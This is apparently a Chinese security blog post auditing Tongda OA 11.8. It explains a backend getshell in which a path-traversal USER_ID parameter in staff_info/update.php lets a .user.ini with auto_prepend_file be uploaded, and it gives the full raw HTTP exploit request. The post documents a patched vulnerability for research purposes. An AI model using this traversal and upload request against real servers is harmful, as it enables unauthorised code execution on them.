---
title: 通达OA代码审计篇二 - 11.8 后台Getshell
date: 2021-03-09 17:33:14
tags:
- php
- tongda
---

---

前篇：[通达OA代码审计篇 - 11.7 有条件的任意命令执行](https://lorexxar.cn/2021/03/03/tongda11-7rce/)

前篇中提到的漏洞在11.8版本中被完全修复后，我痛定思痛，从头开始找一个新的漏洞，于是就有了今天这个漏洞的诞生，但没想到的是，在保留到2021年初时，1月11号更新的11.9版本中再次被定向修复。

今天我们也来看看这一次的漏洞逻辑~

<!--more-->

# 在绕过之前

在提到漏洞之前，首先我们需要清楚通达OA的几个关键机制。

首先是通用文件，整个OA的大部分文件都会引用`inc/utility*`多个文件，里面涉及到了所有OA的通用函数以及一些全局处理、配置文件等。

除了关注到一些过滤函数以外，还有一个比较重要的是在`inc/common.inc.php`的全局处理，并将全局变量对应赋值给对应变量名。

而这个文件被多个基础文件引用，所以我们就有了一个自带的全局变量覆盖，但是是经过过滤的。

可以明确的是，这个问题作为顽疾深深埋在了通达OA的深处，11.7以后的漏洞也大多都是因为这个原因造成的。

除了这个以外，在前一篇文章我提到过，通达OA关于文件上传相关的配置非常完善。首先是建了attachment作为附件目录，正常的文件上传都会传到这里。
```
location /attachment {
    deny all;
}
```

除此之外，上传函数还有3个限制条件：
1、不能没有.
2、不能.之后为空
3、.之后3个字符不能是PHP

且通达本身不解析特殊后缀如pht,phtml等...

换言之，也就是如果一切文件上传都建立在通达OA本身的逻辑上，我们一定没办法只靠文件上传一个漏洞来getshell，在前篇中，我利用了一个文件包含来引用上传的文件。但是在11.8中这个漏洞被修复了，我们就需要找别的办法。

这里我们绕过的思路主要有几个：
1、文件包含+文件上传
可惜，11.8开始，所有涉及到文件包含的接口都做了详细的限制，这样的接口本来也没有几个。
2、文件改名+跨目录文件上传
3、上传一个特殊的配置文件，比如.user.ini

建立在这样的思路基础上，我们挖掘了今天这个漏洞。

# 后台Getshell

这里我们找到
```
/general/hr/manage/staff_info/update.php line 28

```

![image-20210309150207639](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/image-20210309150207639.png)

根据前面的基础，可以清楚这里USERID可控，然后刚好USERID被拼接进去，熟悉的漏洞诞生了，通过设置USERID为`../../../`，我们可以将文件上传到任意位置。

但同样的问题还是存在，我们没办法上传PHP文件，而且比起11.7，这里的上传限制也有一定的改变。添加了一个新的限制

```
function td_path_valid($source, $func_name)
{
    $source_arr = pathinfo($source);
    $source = realpath($source_arr["dirname"]);
    $basename = strtolower($source_arr["basename"]);
    if ($source === false) {
        return false;
    }
    if ($func_name == "td_fopen") {
		$whitelist = "qqwry.dat,tech.dat,tech_cloud.dat,tech_neucloud.dat,";
		if ((strpos($source, "webroot\inc") !== false) && find_id($whitelist, $basename)) {
            return true;
        }
    }
    if ((strpos($source, "webroot") !== false) && (strpos($source, "attachment") === false)) {
        return false;
    }
    else {
        return true;
    }
}
```

这里多了一条限制`if ((strpos($source, "webroot") !== false) && (strpos($source, "attachment") === false))`.

我们需要找到一个同时满足webroot和attachment的目录即可，这里我们选用了
```
webroot\general\reportshop\workshop\report\attachment-remark
```

这里我们构造文件向
```
/general/hr/manage/staff_info/update.php?USER_ID=../../general\reportshop\workshop\report\attachment-remark/1
```
上传t.txt，这里就会成功写入一个1.txt文件。

在这个基础上，我们通过上传.user.ini来修改当前目录的配置。

具体原理可以参考[https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html](https://www.leavesongs.com/PENETRATION/php-user-ini-backdoor.html)

```
POST /general/hr/manage/staff_info/update.php?USER_ID=../../general\reportshop\workshop\report\attachment-remark/.user HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------17518323986548992951984057104
Content-Length: 367
Connection: close
Cookie: PHPSESSID=76vrueivunkeingvpcv7cs4uu3; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=a4c45fc7; KEY_RANDOMDATA=7645
Upgrade-Insecure-Requests: 1

-----------------------------17518323986548992951984057104
Content-Disposition: form-data; name="ATTACHMENT"; filename="ttttttt.ini"
Content-Type: text/plain

auto_prepend_file=1.log
-----------------------------17518323986548992951984057104
Content-Disposition: form-data; name="submit"

提交
-----------------------------17518323986548992951984057104--

```

上传成功之后，上传1.log在目录下，然后请求该路径下任意php文件即可

值得注意的是，修改.user.ini并不是即时生效的，一般来说等待一会儿即可。

比较有意思的修复逻辑也很针对
![image-20210309161916836](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/image-20210309161916836.png)

直接对userid做了过滤。


# 漏洞证明

![image-20210309161804488](https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/blog/image-20210309161804488.png)


# 写在最后

这个漏洞是在前篇文章被修复之后挖掘的，可以算是相对比较隐蔽的漏洞吧，可惜没想到在手里还没过3个月就又被修复了，其实这个漏洞还是有配合的前台绕过方式的，但是由于时期特殊就不公开了，比较可惜的是在11.9中这些漏洞都被修复了。不得不说这几个版本通达的代码风格变化很大，虽然还是免不了挖东墙补西墙的感觉，但一些比较致命的问题都做了限制，后续如果还想挖通达的漏洞就比较难了，希望还能有更好的思路公开出来吧~